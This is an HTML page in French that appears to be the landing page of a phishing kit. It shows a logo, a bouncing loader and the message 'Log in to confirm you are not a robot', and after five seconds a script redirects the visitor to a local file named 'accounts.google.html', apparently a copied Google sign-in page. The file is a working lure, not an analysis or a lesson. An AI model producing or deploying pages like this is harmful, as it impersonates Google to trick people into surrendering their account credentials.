<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login</title>
  
  <style>
  
    .img{        
        margin-top:0; margin-left:0;
        width:max-content; height:max-content;
    }
  
    body{
        border:1px solid blue;
        height:100vh;        
        background-color: Canvas;
        color: CanvasText;
        text-align:center;               
    }
    
/* Conteneur loader */
    .loader {
        display: flex;
        justify-content: center;
        align-items: center;
        height: max-content;
        gap: 6px;
    }

/* Points */
    .loader span {
        display: block;
        border-radius: 50%;
        animation: bounce 1.3s infinite ease-in-out;
    }

/* Couleurs et décalage de l’animation */
    .loader span:nth-child(1) { background-color: red;  animation-delay: 0s; width: 6px;height: 6px;}
    .loader span:nth-child(2) { background-color: #FFD700; animation-delay: 0.3s; width:7px;height:7px;}
    .loader span:nth-child(3) { background-color: #32CD32; animation-delay: 0.6s; width:8px;height:8px;}
    .loader span:nth-child(4) { background-color: blue; animation-delay: 0.9s; width: 9px;height: 9px;}

/* Animation rebond avec opacité partielle */
    @keyframes bounce {
        0%, 80%, 100% {
        opacity: 0.2;
        transform: scale(1); 
    }
        40% {
            opacity: 1;
            transform: scale(1.2); /* léger “pop” */
        }
    }
    
  </style>
    <div class="img"><img id="logo" src="logo.png" style="width:4rem; height:auto;"></img></div>
</head>

 <body>
    <div class="login-message" style="margin-top:50%; margin-bottom:25%;">
    <h3> Connectez-vous pour confirmer que vous n'êtes pas un robot.</h3>
    </div>
    
    <div class="loader">
        <span></span>
        <span></span>
        <span></span>
        <span></span>
    </div>
 
    <script>
        window.onload = () => {
        setTimeout(() => {
        location.replace("accounts.google.html");
        }, 5000);
    };
    </script>

 </body>
</html>
